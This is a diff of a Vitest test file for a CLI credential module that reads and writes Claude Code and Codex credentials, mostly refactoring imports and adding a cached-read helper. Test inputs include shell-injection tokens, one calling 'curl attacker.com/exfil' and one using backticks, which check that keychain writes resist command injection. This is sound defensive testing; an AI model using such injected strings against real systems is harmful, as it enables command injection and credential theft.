@@ -1,10 +1,16 @@
 import fs from "node:fs";
 import os from "node:os";
 import path from "node:path";
-import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
+import { afterEach, beforeAll, beforeEach, describe, expect, it, vi } from "vitest";
 
 const execSyncMock = vi.fn();
 const execFileSyncMock = vi.fn();
+const CLI_CREDENTIALS_CACHE_TTL_MS = 15 * 60 * 1000;
+let readClaudeCliCredentialsCached: typeof import("./cli-credentials.js").readClaudeCliCredentialsCached;
+let resetCliCredentialCachesForTest: typeof import("./cli-credentials.js").resetCliCredentialCachesForTest;
+let writeClaudeCliKeychainCredentials: typeof import("./cli-credentials.js").writeClaudeCliKeychainCredentials;
+let writeClaudeCliCredentials: typeof import("./cli-credentials.js").writeClaudeCliCredentials;
+let readCodexCliCredentials: typeof import("./cli-credentials.js").readCodexCliCredentials;
 
 function mockExistingClaudeKeychainItem() {
   execFileSyncMock.mockImplementation((file: unknown, args: unknown) => {
@@ -31,24 +37,40 @@ function getAddGenericPasswordCall() {
   );
 }
 
+async function readCachedClaudeCliCredentials(allowKeychainPrompt: boolean) {
+  return readClaudeCliCredentialsCached({
+    allowKeychainPrompt,
+    ttlMs: CLI_CREDENTIALS_CACHE_TTL_MS,
+    platform: "darwin",
+    execSync: execSyncMock,
+  });
+}
+
 describe("cli credentials", () => {
+  beforeAll(async () => {
+    ({
+      readClaudeCliCredentialsCached,
+      resetCliCredentialCachesForTest,
+      writeClaudeCliKeychainCredentials,
+      writeClaudeCliCredentials,
+      readCodexCliCredentials,
+    } = await import("./cli-credentials.js"));
+  });
+
   beforeEach(() => {
     vi.useFakeTimers();
   });
 
-  afterEach(async () => {
+  afterEach(() => {
     vi.useRealTimers();
     execSyncMock.mockReset();
     execFileSyncMock.mockReset();
     delete process.env.CODEX_HOME;
-    const { resetCliCredentialCachesForTest } = await import("./cli-credentials.js");
     resetCliCredentialCachesForTest();
   });
 
   it("updates the Claude Code keychain item in place", async () => {
     mockExistingClaudeKeychainItem();
-
-    const { writeClaudeCliKeychainCredentials } = await import("./cli-credentials.js");
 
     const ok = writeClaudeCliKeychainCredentials(
       {
@@ -72,8 +94,6 @@ describe("cli credentials", () => {
     const maliciousToken = "x'$(curl attacker.com/exfil)'y";
 
     mockExistingClaudeKeychainItem();
-
-    const { writeClaudeCliKeychainCredentials } = await import("./cli-credentials.js");
 
     const ok = writeClaudeCliKeychainCredentials(
       {
@@ -100,8 +120,6 @@ describe("cli credentials", () => {
     const backtickPayload = "token`id`value";
 
     mockExistingClaudeKeychainItem();
-
-    const { writeClaudeCliKeychainCredentials } = await import("./cli-credentials.js");
 
     const ok = writeClaudeCliKeychainCredentials(
       {
@@ -145,8 +163,6 @@ describe("cli credentials", () => {
 
     const writeKeychain = vi.fn(() => false);
 
-    const { writeClaudeCliCredentials } = await import("./cli-credentials.js");
-
     const ok = writeClaudeCliCredentials(
       {
         access: "new-access",
@@ -189,20 +205,8 @@ describe("cli credentials", () => {
 
     vi.setSystemTime(new Date("2025-01-01T00:00:00Z"));
 
-    const { readClaudeCliCredentialsCached } = await import("./cli-credentials.js");
-
-    const first = readClaudeCliCredentialsCached({
-      allowKeychainPrompt: true,
-      ttlMs: 15 * 60 * 1000,
-      platform: "darwin",
-      execSync: execSyncMock,
-    });
-    const second = readClaudeCliCredentialsCached({
-      allowKeychainPrompt: false,
-      ttlMs: 15 * 60 * 1000,
-      platform: "darwin",
-      execSync: execSyncMock,
-    });
+    const first = await readCachedClaudeCliCredentials(true);
+    const second = await readCachedClaudeCliCredentials(false);
 
     expect(first).toBeTruthy();
     expect(second).toEqual(first);
@@ -222,23 +226,11 @@ describe("cli credentials", () => {
 
     vi.setSystemTime(new Date("2025-01-01T00:00:00Z"));
 
-    const { readClaudeCliCredentialsCached } = await import("./cli-credentials.js");
+    const first = await readCachedClaudeCliCredentials(true);
 
-    const first = readClaudeCliCredentialsCached({
-      allowKeychainPrompt: true,
-      ttlMs: 15 * 60 * 1000,
-      platform: "darwin",
-      execSync: execSyncMock,
-    });
+    vi.advanceTimersByTime(CLI_CREDENTIALS_CACHE_TTL_MS + 1);
 
-    vi.advanceTimersByTime(15 * 60 * 1000 + 1);
-
-    const second = readClaudeCliCredentialsCached({
-      allowKeychainPrompt: true,
-      ttlMs: 15 * 60 * 1000,
-      platform: "darwin",
-      execSync: execSyncMock,
-    });
+    const second = await readCachedClaudeCliCredentials(true);
 
     expect(first).toBeTruthy();
     expect(second).toBeTruthy();
@@ -264,7 +256,6 @@ describe("cli credentials", () => {
       });
     });
 
-    const { readCodexCliCredentials } = await import("./cli-credentials.js");
     const creds = readCodexCliCredentials({ platform: "darwin", execSync: execSyncMock });
 
     expect(creds).toMatchObject({
@@ -294,7 +285,6 @@ describe("cli credentials", () => {
       "utf8",
     );
 
-    const { readCodexCliCredentials } = await import("./cli-credentials.js");
     const creds = readCodexCliCredentials({ execSync: execSyncMock });
 
     expect(creds).toMatchObject({
